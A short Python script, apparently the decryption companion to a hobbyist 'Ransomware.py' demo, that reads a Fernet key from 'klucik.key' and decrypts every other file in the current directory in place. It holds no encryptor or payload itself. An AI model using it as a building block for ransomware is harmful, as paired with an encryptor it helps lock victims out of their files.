import os
from cryptography.fernet import Fernet

subory = []

for subor in os.listdir():
    if subor == "Ransomware.py" or subor == "klucik.key" or subor == "Ransomware_decrypt.py":
        continue
    if os.path.isfile(subor):
        subory.append(subor)

print(subory)

with open("klucik.key", "rb") as key:
    secretkey = key.read()

for subor in subory:
    with open(subor, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(subor, "wb") as thefile:
        thefile.write(contents_decrypted)
